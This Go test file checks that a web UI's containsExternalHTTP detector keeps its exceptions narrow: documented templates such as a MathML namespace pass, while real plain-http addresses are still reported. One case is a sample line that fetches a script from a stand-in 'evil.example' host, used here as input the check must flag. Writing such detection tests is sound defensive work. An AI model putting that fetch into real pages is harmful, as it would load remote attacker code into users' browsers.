package webui

import "testing"

// The exceptions in containsExternalHTTP are the kind of thing that turns a check off
// without anyone noticing: each was added to let a REAL case through, and a pattern that
// is one character too loose would silence the check it lives in. So the loosening is
// pinned in both directions — the documented templates pass, and every real address is
// still reported.
func TestTheExternalURLExceptionsAreNotTooLoose(t *testing.T) {
	cases := []struct {
		in   string
		want bool
	}{
		// the two documented exceptions
		{`<math xmlns="http://www.w3.org/1998/Math/MathML">`, false},
		{"e.url=`http://${e.url}`", false},
		{`r.replace(/^http:\/\//,"")`, false},
		{`x = "http://" + host`, false},
		// real addresses must still be reported
		{`fetch("http://evil.example/x.js")`, true},
		{`http://cdn.example.com/lib.js`, true},
		{"var u='http://1.2.3.4:8080/a'", true},
		{`https://example.com`, false}, // https is a different scan (none here)
		{`http://localhost:1234`, true},
	}
	for _, c := range cases {
		if got := containsExternalHTTP(c.in); got != c.want {
			t.Errorf("containsExternalHTTP(%q) = %v, want %v", c.in, got, c.want)
		}
	}
}
